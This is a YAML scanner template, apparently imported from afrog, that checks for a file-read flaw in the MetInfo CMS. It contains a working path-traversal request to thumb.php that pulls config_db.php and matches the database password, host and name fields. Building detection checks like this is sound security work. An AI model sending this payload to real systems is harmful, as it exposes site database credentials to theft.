# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - con_db_pass
          - con_db_host
          - con_db_name
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
id: metinfo-file-read
info:
  author: amos1
  description: Metinfo file read
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Metinfo file read
  severity: high
  tags: metinfo,fileread,argus-import
